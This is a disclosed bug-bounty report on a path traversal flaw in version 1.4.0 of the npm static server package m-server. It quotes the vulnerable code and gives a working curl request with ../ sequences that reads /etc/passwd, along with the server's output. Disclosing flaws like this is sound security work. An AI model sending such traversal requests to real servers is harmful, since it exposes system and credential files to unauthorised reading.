# [m-server] Path Traversal allows to display content of arbitrary file(s) from the server

## Report Details
- **Report ID**: 319795
- **URL**: https://hackerone.com/reports/319795
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-26T14:13:50.358Z
- **Disclosed**: 2018-07-12T08:41:18.156Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Path Traversal in ```m-server``` module.
It allows to read content of any arbitrary file from the server where ```m-server``` is installed and run.

## Module

**module name:** m-server
**version:** 1.4.0
**npm page:** https://www.npmjs.com/package/m-server

### Module Description

M-Server is a mini http static server that without any dependencies;

### Module Stats

Stats
6 downloads in the last day
68 downloads in the last week
180 downloads in the last month

~2200 estimated downloads per year

## Vulnerability Description

Path Traversal vulnerability in m-server module allows to go up in directory tree and read content of any file, like ```/etc/passwd```

Vulnerability exists, because ```m-server``` does not implement any protection against Path Traversal attacks and use provided path as-is:

```javascript
// node_modules/m-server/lib/index.js, line 10

    var targetPath = path.join(rootPath, req.url);
    if (fs.existsSync(targetPath)) {
        var targetType = fs.lstatSync(targetPath);
        if (targetType.isFile()) {
            res.end(fs.readFileSync(targetPath))   // <-- vulnerable code
        } else if (targetType.isDirectory()) {
            
            (...)

    } else {
        res.writeHead(404, {'Content-Type': 'text/plain'});
        res.end('not found');
    }
```


## Steps To Reproduce:

Install ```m-server``` module:

```
$ npm install m-server
```

Run ```m-server```:

```
$ ./node_modules/m-server/index.js -p 8080
-------------------------------------------------------------
	Mini http server running on port 8080 !
	You can open the floowing urls to view files.
	127.0.0.1:8080
	10.235.1.22:8080
	10.235.4.26:8080
	Have fun ^_^
-------------------------------------------------------------

```

Run following curl command to retrieve content of ```/etc/passwd``` (adjust amount of ../ to reflect your system):

```
$ curl -v --path-as-is http://localhost:8080/../../../../../../etc/passwd
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 26 Feb 2018 13:38:37 GMT
< Connection: keep-alive
< Content-Length: 2615
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(...)
mysql:x:125:132:MySQL Server,,,:/nonexistent:/bin/false
* Connection #0 to host localhost left intact
```

## Patch

```targetPath``` should be sanitized against Path Traversal attacks before it's used in ```res.end(fs.readFileSync(targetPath))```

## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- curl 7.47.0

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

Malicious user is able to display content of any file from the server using eg. crafted ```curl``` request

## Attachments
No attachments
